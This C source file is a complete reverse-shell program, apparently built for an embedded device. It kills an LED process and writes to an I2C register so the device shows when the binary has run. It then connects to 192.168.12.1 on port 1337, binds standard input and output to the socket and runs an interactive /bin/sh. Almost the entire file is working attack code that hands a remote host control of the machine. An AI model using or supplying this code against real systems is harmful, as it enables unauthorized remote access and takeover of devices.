#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

/*
Simple remote shell
 */

#define REMOTE_ADDR "192.168.12.1"
#define REMOTE_PORT 1337

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;
    int ret;
    char *arg[] = {"/bin/sh", "-i", 0};

    /*
      Turn off all LED
      to have a visual indication
      the binary has been executed
     */
    system("/bin/killall -9 ledplayer &");
    system("/bin/i2cset -f -y 0 0x17 0x44 0x00 &");

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    ret = -1;
    while (ret < 0) {
        sleep(1);
        ret = connect(s, (struct sockaddr *)&sa, sizeof(sa));
    }
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve(arg[0], arg, NULL);
    return 0;
}